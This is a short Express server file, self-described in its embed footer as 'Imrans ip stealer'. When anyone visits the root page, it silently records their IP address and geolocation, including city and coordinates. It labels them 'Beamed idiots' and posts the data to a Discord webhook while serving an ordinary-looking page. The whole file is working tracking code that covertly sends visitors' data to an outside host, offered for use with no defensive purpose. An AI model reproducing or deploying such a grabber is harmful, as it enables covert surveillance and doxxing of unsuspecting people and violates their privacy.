import express from 'express';
import bodyParser from 'body-parser';
import axios from 'axios';
import ejs from 'ejs';
import os from 'os';
import geoip from 'geoip-lite';

const app = express();
const port = 3000;

app.set("view engine", "ejs");

app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const geo = geoip.lookup(ip);

  const location = {
    country: geo.country,
    region: geo.region,
    city: geo.city,
    ll: geo.ll
  };

  const message = `Beamed idiots  IP Address: ${ip}\nBeamed idiots  location: ${JSON.stringify(location)}`;
  console.log(message);

  const webhook_url = process.env['Webhook'];
  sendDiscordWebhook(message);

  res.render("index", { ip });
});

app.listen(port, () => {
  console.log(`Server is listening on http://localhost:${port}`);
});

function sendDiscordWebhook(message) {
  const webhook_url = process.env['Webhook'];

  const embed = {
    title: 'A beam has been detected!',
    description: message,
    color: 0xFF0000,
    footer: {
      text: 'Imrans ip stealer.Made with typescript'
    }
  };

  const payload = {
    embeds: [embed]
  };

  axios.post(webhook_url, payload)
    .then(response => {
      console.log('Message sent to Discord webhook');
    })
    .catch(error => {
      console.error('Error sending message to Discord webhook', error);
    });
}
